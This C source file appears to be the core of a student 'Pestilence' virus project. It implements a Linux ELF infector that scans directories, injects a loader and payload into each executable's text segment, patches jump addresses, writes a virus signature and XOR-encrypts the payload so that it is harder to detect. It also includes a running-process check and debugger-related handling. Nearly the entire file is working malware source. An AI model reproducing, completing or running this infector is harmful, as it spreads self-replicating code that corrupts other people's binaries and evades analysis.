#include "pestilence.h"

static void	init_info(t_info *info)
{
	info->text_begin = 0;
	info->text_size = 0;
	info->valid_target = 1;
}

static void	patch_loader(t_info *info)
{
	int32_t	start;
	int32_t	end;
	int32_t val;

	// rewrite jmp to payload
	start = info->text_addr + info->text_size + LOADER_SIZE;
	end = (int32_t)(info->addr_payload + MAIN_OFFSET);
	val = end - start;
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 4, &val, 4);

	// rewrite addr for mprotect
	start = info->text_addr + info->text_size + 0x69;
	end = info->addr_payload;
	val = end - start;
	ft_memcpy(info->text_begin + info->text_size + 0x65, &val, 4); // 0x65 is pos of instruction targeted in loader
}

static void	inject_loader(t_info *info)
{
	void		*addr;

	addr = &loader;
	ft_memcpy(info->text_begin + info->text_size, addr, LOADER_SIZE);
	patch_loader(info);
}


static void	patch_payload(t_info *info)
{
	int32_t	start;
	int32_t	end;
	int32_t	val;

	start = (int32_t)(info->addr_payload + PAYLOAD_SIZE);
	end = info->text_addr + info->text_size + LOADER_SIZE;
	val = end - start;

	// replace jmp addr
	ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 4, &val, 4);
	// replace ret by jmp
	val = 0xe9;
	ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 5, &val, 1);
	// replace leave by pop rbp
	val = 0x5dec8948;
	ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 9, &val, 4);
}

static void	inject_payload(t_info *info)
{
	void		*addr;

	addr = &ft_memcpy;
	ft_bzero(info->file + info->begin_bss, info->bss_size);
	ft_memcpy(info->file + info->offset_payload, addr, PAYLOAD_SIZE);
	patch_payload(info);
}

void	patch_end(t_info *info, int32_t nb)
{
	int32_t	start;
	int32_t	end;
	int32_t	val;

	start = info->text_addr + info->text_size + LOADER_SIZE + END_SIZE;
	start -= (5 * (nb - 1));
	end = (int32_t)((size_t)(info->addr_hooked_func) - (size_t)(info->text_begin) + info->text_addr);
	val = end - start;
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 4 - (5 * (nb - 1)), &val, 4);
}

static void	inject_end(t_info *info)
{
	void		*addr;	

	addr = &ft_end;
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE, addr, END_SIZE);
}

static void	patch_addresses(t_info *info)
{
	int32_t		start;
	int32_t		end;
	int32_t		val;

	// &loader
	start = info->addr_payload + OFFSET_1 + 4;
	end = (int32_t)(info->text_addr + info->text_size);
	val = end - start;
	ft_memcpy(info->file + info->offset_payload + OFFSET_1, &val, 4);

	// &ft_memcpy
	start = info->addr_payload + OFFSET_2 + 4;
	end = (int32_t)(info->addr_payload);
	val = end - start;
	ft_memcpy(info->file + info->offset_payload + OFFSET_2, &val, 4);

	// &ft_end
	start = info->addr_payload + OFFSET_3 + 4;
	end = (int32_t)(info->text_addr + info->text_size + LOADER_SIZE);
	val = end - start;
	ft_memcpy(info->file + info->offset_payload + OFFSET_3, &val, 4);

}

static int		reload_mapping(t_info *info)
{
	void	*new;
	size_t	new_size;

	new_size = info->file_size + info->bss_size + PAYLOAD_SIZE;
	if ((new = ft_sysmmap(0, new_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
		return (1);
	ft_memcpy(new, info->file, info->file_size);
	ft_sysmunmap(info->file, info->file_size);
	info->file = new;
	info->file_size = new_size;
	return (0);
}

static int		inject_sign(t_info *info)
{
	uint32_t	magic = MAGIC_VIRUS;
	char		buf[0x40];

	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE, &magic, 4);
	write_sign(buf);
	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE + 4, buf, SIGN_SIZE);
	return (0);
}

uint32_t    encrypt(void *ptr, size_t size)
{
    uint32_t    *file;
    uint32_t    key;
    size_t      i;  

    file = (uint32_t *)ptr;
    key = KEY;
    int nb = 0;
	size = (size / 4 ) * 4;
    while (nb < 8)
    {   
        i = 0;
        while (i * 4 < size - 4)
        {   
            file[i] ^= key;
            key += file[i];
            i++;
        }   
        key -= SUB;
        nb++;
    }
    return (key);
}

void			patch_key(t_info *info, uint32_t key)
{
	uint32_t val;
	// Key in loader
	val = key;
	ft_memcpy(info->text_begin + info->text_size + 0x7C, &val, 4); // 0x7D is pos of instruction targeted in loader
}


static void	nice_with_gdb(t_info *info)
{
	size_t size;
	size = info->file_size - (info->bss_size + PAYLOAD_SIZE);
	size = size - info->begin_bss;

 	ft_memcpy_r(info->file + info->offset_payload + PAYLOAD_SIZE, info->file + info->begin_bss, size);
}

static void		infect_file(char *path)
{
	struct stat		st;
	t_info			info;
	int				fd;
	uint32_t		magic;
	
	if ((fd = ft_sysopen(path, O_RDWR)) < 0)
		return ;
	init_info(&info);
	ft_sysfstat(fd, &st);
	info.file_size = st.st_size;
	if (info.file_size > 50*1024*1024)
		goto end_close;
	if ((info.file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		goto end_close;
	if ((magic = *((uint32_t *)(info.file))) != 0x464C457F)
		goto end_fct;
	pe_parsing(&info);
	if (reload_mapping(&info) == 1)
		goto end_fct;
	if (find_text(&info) == 1)
		goto end_fct;
	inject_loader(&info);
	nice_with_gdb(&info);
	inject_payload(&info);
	inject_end(&info);
	epo_parsing(&info);
	if (info.valid_target == 0)
		goto end_fct;
	patch_addresses(&info);
	inject_sign(&info);
	patch_key(&info, encrypt(info.file + info.offset_payload, PAYLOAD_SIZE));
	ft_syswrite(fd, info.file, info.file_size);
	end_fct:
	ft_sysmunmap(info.file, info.file_size);
	end_close:
	ft_sysclose(fd);
	return ;
}

static int		infect_dir(char *path)
{
	char					buf_d[1024];
	struct linux_dirent64	*dir;
	int						fd, n_read, pos;
	char					buf_path_file[PATH_MAX];

	n_read = 0;
	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
		return (1);
	while ((n_read = ft_sysgetdents(fd, buf_d, 1024)) > 0)
	{
		for (pos = 0; pos < n_read;)
		{
			dir = (struct linux_dirent64 *)(buf_d + pos);
			if (dir->d_type == 8) //dt_reg
			{
				ft_memcpy(buf_path_file, path, PATH_MAX);
				ft_strcat(buf_path_file, dir->d_name);
				infect_file(buf_path_file);
			}
			pos += dir->d_reclen;
		}
	}
	ft_sysclose(fd);
	return (0);
}

int		main()
{
	char			buf[BUF_SIZE];
	char			buf_path[PATH_MAX];

	write_proc(buf_path);
	if ((check_process(buf_path)) == 1)
		return (0);

	write_begin(buf);
	ft_syswrite(1, buf, 8);

	write_test(buf_path);
	infect_dir(buf_path);
	write_test2(buf_path);
	infect_dir(buf_path);
	return (0);
}
